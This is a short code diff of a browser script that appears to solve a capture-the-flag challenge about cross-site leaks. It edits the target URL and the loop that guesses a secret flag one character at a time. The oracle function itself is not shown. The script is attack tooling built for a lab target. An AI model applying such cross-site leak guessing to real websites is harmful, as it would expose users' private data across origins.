@@ -1,5 +1,5 @@
 <script>
-const APP = "https://app-a6b8822d662c.are-xsleaks-dead.ctf.theromanxpl0.it";
+const APP = "http://app-e1d1160567e9.are-xsleaks-dead.ctf.theromanxpl0.it/";
 
 const charset = "abcdefghijklmnopqrstuvwxyz0123456789_";
 let flag = "TRX{";
@@ -16,7 +16,7 @@ function test(prefix) {
 }
 
 async function solve() {
-    while (!flag.endsWith("}")) {
+    while (flag.length < 35) {
         for (let c of charset) {
             let guess = flag + c;
             console.log("Trying:", guess);
